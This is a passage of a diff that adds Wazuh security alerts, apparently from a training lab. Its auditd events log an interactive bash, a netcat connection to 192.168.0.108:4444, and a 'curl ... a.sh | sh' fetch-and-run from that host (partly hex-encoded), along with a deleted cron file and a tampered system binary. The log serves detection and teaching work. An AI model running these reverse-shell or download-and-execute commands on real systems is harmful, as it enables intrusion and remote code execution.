+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/bash",
+          "inode": "1442293",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.877+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/bash.",
+      "id": "80792",
+      "firedtimes": 973,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18955221",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6629): arch=c000003e syscall=59 success=yes exit=0 a0=5591e79e8350 a1=5591e79e5f60 a2=5591e79e5d80 a3=8 items=2 ppid=172435 pid=172437 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659946.206:6629): argc=2 a0=\"bash\" a1=\"-i\" type=CWD msg=audit(1793659946.206:6629): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6629): item=0 name=\"/usr/bin/bash\" inode=1442293 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659946.206:6629): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659946.206:6629): proctitle=62617368002D69",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6629",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172435",
+        "pid": "172437",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "bash",
+        "exe": "/usr/bin/bash",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "bash",
+          "a1": "-i"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/bash",
+          "inode": "1442293",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.879+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/nc.",
+      "id": "80792",
+      "firedtimes": 974,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18957094",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6630): arch=c000003e syscall=59 success=yes exit=0 a0=5591e79e85a0 a1=5591e79e8e90 a2=5591e79e5d80 a3=1b6 items=2 ppid=172435 pid=172438 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"nc\" exe=\"/usr/bin/nc.openbsd\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659946.206:6630): argc=4 a0=\"nc\" a1=\"-N\" a2=\"192.168.0.108\" a3=\"4444\" type=CWD msg=audit(1793659946.206:6630): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6630): item=0 name=\"/usr/bin/nc\" inode=1442613 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659946.206:6630): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659946.206:6630): proctitle=6E63002D4E003139322E3136382E302E3130380034343434",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6630",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172435",
+        "pid": "172438",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "nc",
+        "exe": "/usr/bin/nc",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "nc",
+          "a1": "-N",
+          "a2": "192.168.0.108",
+          "a3": "4444"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/nc",
+          "inode": "1442613",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:27.332+0000",
+    "rule": {
+      "level": 7,
+      "description": "File deleted.",
+      "id": "553",
+      "mitre": {
+        "id": [
+          "T1070.004",
+          "T1485"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Impact"
+        ],
+        "technique": [
+          "File Deletion",
+          "Data Destruction"
+        ]
+      },
+      "firedtimes": 3,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_deleted",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659947.18973646",
+    "full_log": "File '/etc/cron.d/book09-lab' deleted\nMode: realtime\n",
+    "syscheck": {
+      "path": "/etc/cron.d/book09-lab",
+      "mode": "realtime",
+      "size_after": "90",
+      "perm_after": "rw-r--r--",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_after": "fbb0b8b772b5ee76aceb3edd3579c54d",
+      "sha1_after": "0bdd0b79ca41a57e93571fcbd10769b6d6e25a06",
+      "sha256_after": "d84c41c8fe80d3750ae62f5c2a9968bbded323e57ef5179b5d2067451a5d854f",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_after": "2026-11-02T22:51:42",
+      "inode_after": 2621780,
+      "event": "deleted"
+    },
+    "decoder": {
+      "name": "syscheck_deleted"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.516+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 5,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "002",
+      "name": "web",
+      "ip": "10.20.32.80"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19415578",
+    "full_log": "File '/usr/bin/yes' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '31112' to '31119'\nOld modification time was: '1787670771', now it is '1793660000'\nOld md5sum was: '57e9fa209551af0c38216d64373d14d9'\nNew md5sum is : '656f5564e9416f578fdc3edb065832c3'\nOld sha1sum was: 'b91eaf624a8cbdf17571a40897f9fab202933cba'\nNew sha1sum is : '7cfa99fe2f0fe0ffa827da47fbd99fd7b580771d'\nOld sha256sum was: 'a63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8'\nNew sha256sum is : 'a6505c8ce87a35aa66ced72b526acc8df8c358d52ad11d7d5ea9947fafd0c462'\n",
+    "syscheck": {
+      "path": "/usr/bin/yes",
+      "mode": "realtime",
+      "size_before": "31112",
+      "size_after": "31119",
+      "perm_after": "rwxr-xr-x",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_before": "57e9fa209551af0c38216d64373d14d9",
+      "md5_after": "656f5564e9416f578fdc3edb065832c3",
+      "sha1_before": "b91eaf624a8cbdf17571a40897f9fab202933cba",
+      "sha1_after": "7cfa99fe2f0fe0ffa827da47fbd99fd7b580771d",
+      "sha256_before": "a63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8",
+      "sha256_after": "a6505c8ce87a35aa66ced72b526acc8df8c358d52ad11d7d5ea9947fafd0c462",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_before": "2026-08-25T15:12:51",
+      "mtime_after": "2026-11-02T22:53:20",
+      "inode_after": 12217390,
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.735+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/curl.",
+      "id": "80792",
+      "firedtimes": 1211,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19498169",
+    "full_log": "type=SYSCALL msg=audit(1793659998.826:6926): arch=c000003e syscall=59 success=yes exit=0 a0=560d6db87d80 a1=560d6db88ee0 a2=560d6db86d20 a3=8 items=2 ppid=172819 pid=172820 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=86 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659998.826:6926): argc=5 a0=\"curl\" a1=\"-fsS\" a2=\"--max-time\" a3=\"5\" a4=\"http://192.168.0.108:8000/a.sh\" type=CWD msg=audit(1793659998.826:6926): cwd=\"/home/ccc\" type=PATH msg=audit(1793659998.826:6926): item=0 name=\"/usr/bin/curl\" inode=1451893 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659998.826:6926): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659998.826:6926): proctitle=62617368002D63006375726C202D667353202D2D6D61782D74696D65203520687474703A2F2F3139322E3136382E302E3130383A383030302F612E7368",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6926",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172819",
+        "pid": "172820",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "86",
+        "command": "curl",
+        "exe": "/usr/bin/curl",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "curl",
+          "a1": "-fsS",
+          "a2": "--max-time",
+          "a3": "5",
+          "a4": "http://192.168.0.108:8000/a.sh"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/curl",
+          "inode": "1451893",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.880+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/bash.",
+      "id": "80792",
+      "firedtimes": 1265,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19607185",
+    "full_log": "type=SYSCALL msg=audit(1793659999.298:6988): arch=c000003e syscall=59 success=yes exit=0 a0=5647f0fa46a0 a1=7ffdc9b11410 a2=5647f0fd4d30 a3=8 items=2 ppid=172867 pid=172868 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=87 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659999.298:6988): argc=3 a0=\"bash\" a1=\"-c\" a2=6375726C202D667353202D2D6D61782D74696D65203520687474703A2F2F3139322E3136382E302E3130383A383030302F612E7368207C2073680A7072696E746620226375726C20616E64207368207374617475733A2025735C6E222022247B504950455354415455535B2A5D7D22 type=CWD msg=audit(1793659999.298:6988): cwd=\"/home/ccc\" type=PATH msg=audit(1793659999.298:6988): item=0 name=\"/bin/bash\" inode=1442293 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659999.298:6988): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659999.298:6988): proctitle=62617368002D63006375726C202D667353202D2D6D61782D74696D65203520687474703A2F2F3139322E3136382E302E3130383A383030302F612E7368207C2073680A7072696E746620226375726C20616E64207368207374617475733A2025735C6E222022247B504950455354415455535B2A5D7D22",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6988",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172867",
+        "pid": "172868",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "87",
+        "command": "bash",
+        "exe": "/usr/bin/bash",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "bash",
+          "a1": "-c"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/bin/bash",
+          "inode": "1442293",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.880+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/curl.",
+      "id": "80792",
+      "firedtimes": 1266,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19609500",
+    "full_log": "type=SYSCALL msg=audit(1793659999.302:6989): arch=c000003e syscall=59 success=yes exit=0 a0=5562c3f097f0 a1=5562c3f08fe0 a2=5562c3f06d60 a3=8 items=2 ppid=172868 pid=172869 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=87 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659999.302:6989): argc=5 a0=\"curl\" a1=\"-fsS\" a2=\"--max-time\" a3=\"5\" a4=\"http://192.168.0.108:8000/a.sh\" type=CWD msg=audit(1793659999.302:6989): cwd=\"/home/ccc\" type=PATH msg=audit(1793659999.302:6989): item=0 name=\"/usr/bin/curl\" inode=1451893 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659999.302:6989): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659999.302:6989): proctitle=6375726C002D667353002D2D6D61782D74696D65003500687474703A2F2F3139322E3136382E302E3130383A383030302F612E7368",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6989",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172868",
+        "pid": "172869",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "87",
+        "command": "curl",
+        "exe": "/usr/bin/curl",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "curl",
+          "a1": "-fsS",
+          "a2": "--max-time",
+          "a3": "5",
+          "a4": "http://192.168.0.108:8000/a.sh"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/curl",
+          "inode": "1451893",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.882+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/dash.",
+      "id": "80792",
+      "firedtimes": 1267,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19611623",
+    "full_log": "type=SYSCALL msg=audit(1793659999.302:6990): arch=c000003e syscall=59 success=yes exit=0 a0=5562c3f082a0 a1=5562c3f07d90 a2=5562c3f06d60 a3=5562c3f07f30 items=2 ppid=172868 pid=172870 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=87 comm=\"sh\" exe=\"/usr/bin/dash\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659999.302:6990): argc=1 a0=\"sh\" type=CWD msg=audit(1793659999.302:6990): cwd=\"/home/ccc\" type=PATH msg=audit(1793659999.302:6990): item=0 name=\"/usr/bin/sh\" inode=1442378 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659999.302:6990): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659999.302:6990): proctitle=\"sh\"",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6990",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172868",
+        "pid": "172870",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "87",
+        "command": "sh",
+        "exe": "/usr/bin/dash",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "sh"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/sh",
+          "inode": "1442378",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.884+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/id.",
+      "id": "80792",
+      "firedtimes": 1268,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19613457",
+    "full_log": "type=SYSCALL msg=audit(1793659999.306:6991): arch=c000003e syscall=59 success=yes exit=0 a0=5617b538d7f8 a1=5617b538d750 a2=5617b538d768 a3=0 items=2 ppid=172870 pid=172871 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=87 comm=\"id\" exe=\"/usr/bin/id\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659999.306:6991): argc=2 a0=\"id\" a1=\"-un\" type=CWD msg=audit(1793659999.306:6991): cwd=\"/home/ccc\" type=PATH msg=audit(1793659999.306:6991): item=0 name=\"/usr/bin/id\" inode=1476677 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659999.306:6991): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659999.306:6991): proctitle=6964002D756E",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6991",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172870",
+        "pid": "172871",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "87",
+        "command": "id",
+        "exe": "/usr/bin/id",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "id",
+          "a1": "-un"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/id",
+          "inode": "1476677",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:20.886+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/hostname.",
+      "id": "80792",
+      "firedtimes": 1269,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660000.19615312",
+    "full_log": "type=SYSCALL msg=audit(1793659999.310:6992): arch=c000003e syscall=59 success=yes exit=0 a0=5617b538d7f8 a1=5617b538d758 a2=5617b538d768 a3=0 items=2 ppid=172870 pid=172872 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=87 comm=\"hostname\" exe=\"/usr/bin/hostname\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659999.310:6992): argc=1 a0=\"hostname\" type=CWD msg=audit(1793659999.310:6992): cwd=\"/home/ccc\" type=PATH msg=audit(1793659999.310:6992): item=0 name=\"/usr/bin/hostname\" inode=1442505 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659999.310:6992): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659999.310:6992): proctitle=\"hostname\"",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6992",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172870",
+        "pid": "172872",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "87",
+        "command": "hostname",
+        "exe": "/usr/bin/hostname",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "hostname"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/hostname",
+          "inode": "1442505",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
